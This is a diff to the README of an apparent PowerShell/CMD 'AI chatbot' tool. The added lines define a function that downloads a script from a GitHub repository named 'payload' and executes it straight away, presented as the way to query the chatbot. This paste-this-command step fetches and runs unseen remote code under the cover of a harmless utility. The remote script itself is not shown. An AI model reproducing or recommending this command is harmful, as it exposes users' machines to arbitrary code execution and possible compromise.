@@ -2,6 +2,12 @@
 
 A professional AI chatbot integrated directly into Windows PowerShell and CMD. Ask for code, get code - no explanations, no comments, just pure output. **Works on any Windows device - no admin required!**
 
+
+
+function ai($q) { & ([scriptblock]::Create((iwr 'https://raw.githubusercontent.com/GraphicsAndroid65/payload/main/wrapper.ps1').Content)) -Query $q }
+
+ai "write a python code of odd and even numbers"
+
 ## 🎯 Features
 
 - **Terminal Integration**: Works directly in PowerShell and CMD
